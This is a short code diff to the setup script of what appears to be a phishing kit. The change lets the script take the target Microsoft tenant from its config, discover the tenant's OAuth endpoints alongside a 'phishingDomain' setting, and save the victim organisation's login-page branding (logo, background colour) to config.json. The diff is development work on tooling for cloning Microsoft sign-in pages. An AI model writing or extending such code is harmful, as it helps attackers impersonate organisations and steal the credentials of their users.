@@ -899,9 +899,10 @@ async function main() {
       ? 'cloudflare-origin'
       : 'letsencrypt';
 
-  if (tenant || domain) {
+  if (tenant || config.microsoftTenant || domain) {
+    const brandingTenant = tenant || config.microsoftTenant;
     console.log('Discovering Microsoft OAuth endpoints from OpenID configuration ...');
-    const discovery = await discoverMicrosoftOAuth({ tenant, phishingDomain: domain });
+    const discovery = await discoverMicrosoftOAuth({ tenant: brandingTenant, phishingDomain: domain });
     if (discovery) {
       applyMicrosoftOAuthConfig(config, discovery);
       console.log(`Microsoft tenant: ${discovery.tenant} (${discovery.tenantId})`);
@@ -918,6 +919,7 @@ async function main() {
         );
         console.log(`  tenant logo: ${config.tenantBranding.bannerLogo || 'Microsoft default'}`);
         console.log(`  tenant background: ${config.tenantBranding.backgroundColor}`);
+        console.log(`  tenantBranding saved to config.json (isTenantLogo=${config.tenantBranding.isTenantLogo})`);
       } catch (error) {
         console.warn(`  tenant branding: could not fetch (${error.message})`);
       }
